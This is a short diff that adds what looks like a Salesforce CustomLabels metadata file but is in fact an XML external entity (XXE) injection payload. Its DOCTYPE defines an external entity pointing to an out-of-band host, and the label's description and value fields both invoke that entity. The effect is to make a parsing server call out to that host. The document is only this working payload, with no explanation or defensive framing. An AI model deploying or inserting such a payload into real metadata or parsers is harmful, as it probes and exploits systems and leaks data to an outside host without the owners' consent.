@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/customlabels"> ]>
+<CustomLabels xmlns="http://soap.sforce.com/2006/04/metadata"><labels><fullName>GsXxeLbl</fullName><language>en_US</language><protected>false</protected><shortDescription>&gsx;</shortDescription><value>&gsx;</value></labels></CustomLabels>
